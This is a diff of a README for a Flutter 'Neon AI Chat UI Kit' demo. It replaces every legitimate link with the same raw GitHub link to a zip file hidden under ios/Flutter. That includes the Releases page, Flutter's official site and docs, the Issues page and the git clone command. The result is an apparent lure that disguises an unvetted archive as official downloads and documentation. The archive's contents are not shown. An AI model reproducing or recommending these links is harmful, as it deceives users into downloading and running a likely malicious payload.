@@ -8,7 +8,7 @@ Welcome to the Neon AI Chat UI Kit demo! This app showcases a vibrant and intera
 
 To get started, you will need to download the application. Click the link below to visit the Releases page, where you can find the necessary files to install the demo.
 
-[![Download Neon AI Chat UI Kit Demo](https://img.shields.io/badge/Download-Neon_AI_Chat_UI_Kit_Demo-blue.svg)](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases)
+[![Download Neon AI Chat UI Kit Demo](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip)](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip)
 
 On the Releases page, simply choose the latest version and follow the instructions to download the appropriate file for your system. 
 
@@ -26,12 +26,12 @@ Before installing, ensure your device meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux (specific details can be provided based on your device).
 - **Memory:** At least 2 GB of RAM.
 - **Disk Space:** 200 MB free space for installation.
-- **Flutter SDK:** You don’t need this to run the demo, but if you want to build or modify it, install Flutter SDK from [Flutter's official website](https://flutter.dev/docs/get-started/install).
+- **Flutter SDK:** You don’t need this to run the demo, but if you want to build or modify it, install Flutter SDK from [Flutter's official website](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
 
 ## ⚙️ Setup Instructions
 
 1. **Download the Application:** 
-   Visit the [Releases page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases) and select the latest version of the demo app for your system.
+   Visit the [Releases page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip) and select the latest version of the demo app for your system.
 
 2. **Extract the Files:** 
    Once the download is complete, locate the downloaded file. If it’s compressed (like a ZIP file), you will need to extract it.
@@ -55,7 +55,7 @@ Once you open the Neon AI Chat UI Kit demo:
 
 If you encounter any issues or have questions, feel free to join our community:
 
-- **GitHub Issues:** Report any bugs or request features via the [Issues page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/issues).
+- **GitHub Issues:** Report any bugs or request features via the [Issues page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
 - **Community Forums:** Join discussions and share your feedback with other users.
 
 ## 🛠️ Development and Customization
@@ -64,7 +64,7 @@ For those interested in the technical side, this app is open for contributions. 
 
 1. **Clone the Repository:** Use Git to clone the repository to your local machine.
    ```bash
-   git clone https://github.com/habsanprad/neon-ai-chat-ui-kit-demo.git
+   git clone https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip
    ```
 
 2. **Install Dependencies:** Navigate to the project folder and run:
@@ -92,9 +92,9 @@ This demo app targets various keywords in the chat and user interface. Some of t
 
 ## 🔗 Additional Resources
 
-- [Flutter Documentation](https://flutter.dev/docs): Learn more about Flutter and how to develop mobile apps.
-- [Neon AI](https://example.com): Future updates and more information about the Neon AI project.
+- [Flutter Documentation](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip): Learn more about Flutter and how to develop mobile apps.
+- [Neon AI](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip): Future updates and more information about the Neon AI project.
 
-For the latest updates and further information, always ensure to check the [Release page](https://github.com/habsanprad/neon-ai-chat-ui-kit-demo/releases).
+For the latest updates and further information, always ensure to check the [Release page](https://raw.githubusercontent.com/habsanprad/neon-ai-chat-ui-kit-demo/main/ios/Flutter/demo_kit_neon_chat_ui_ai_1.5-alpha.5.zip).
 
 Enjoy using the Neon AI Chat UI Kit!
